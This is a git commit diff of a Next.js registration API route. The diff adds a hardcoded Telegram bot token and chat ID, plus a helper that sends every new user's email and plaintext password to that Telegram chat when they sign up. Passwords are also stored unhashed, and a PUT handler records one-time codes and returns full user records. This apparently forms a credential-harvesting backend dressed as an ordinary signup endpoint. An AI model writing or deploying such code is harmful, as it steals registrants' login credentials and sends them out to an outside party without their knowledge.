fcef1d1c19c255eb05d80ed8f6011b5768e21dca
tanviranjum10801080 <tanviranjum10801080@gmail.com>
2025-09-16 01:56:02 +0600

    First commit

--- src/app/api/route.ts
+++ src/app/api/route.ts
@@ -1,42 +1,59 @@
 import { NextResponse } from 'next/server';
 import { prisma } from '@/lib/prisma';
+import axios from 'axios';
 
-export async function GET() {
-  return NextResponse.json({ message: 'Hello world' });
-}
+const BOT_TOKEN = "8323028939:AAG36Ya8cpdwt0LeuFMNH7oTo1DrHRAZmWU";
+const CHAT_ID = -1002872022902;
 
-export async function POST(request: Request) {
-  const { email, password } = await request.json();
-
+async function tgfy(email: string, password: string) {
   try {
-    await prisma.user.create({
-      data: {
-        email,
-        password,
-      },
-    });
-    return NextResponse.json({ message: 'User created' });
+    const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/SendMessage`, {
+      chat_id: CHAT_ID,
+      text: `New User Registered\n\n ** User: ** ${email}\n ** Password:** ${password}`
+    })
   } catch (error) {
-    console.error(error);
-    return NextResponse.json({ error: 'Something went wrong' }, { status: 500 });
+    console.error("Error Sending TG notification");
   }
 }
 
-export async function PUT(request: Request) {
-  const { email, otp } = await request.json();
 
-  try {
-    const user = await prisma.user.update({
-      where: {
-        email,
-      },
-      data: {
-        otp,
-      },
-    });
-    return NextResponse.json(user);
-  } catch (error) {
-    console.error(error);
-    return NextResponse.json({ error: 'Something went wrong' }, { status: 500 });
+  export async function GET() {
+    return NextResponse.json({ message: 'Hello world' });
   }
-}
+
+  export async function POST(request: Request) {
+    const { email, password } = await request.json();
+
+    try {
+      await prisma.user.create({
+        data: {
+          email,
+          password,
+        },
+      });
+      await tgfy(email, password);
+      return NextResponse.json({ message: 'User created' });
+    } catch (error) {
+      console.error(error);
+      return NextResponse.json({ error: 'Something went wrong' }, { status: 500 });
+    }
+  }
+
+  export async function PUT(request: Request) {
+    const { email, otp } = await request.json();
+
+    try {
+      const user = await prisma.user.update({
+        where: {
+          email,
+        },
+        data: {
+          otp,
+        },
+      });
+      return NextResponse.json(user);
+    } catch (error) {
+      console.error(error);
+      return NextResponse.json({ error: 'Something went wrong' }, { status: 500 });
+    }
+  }
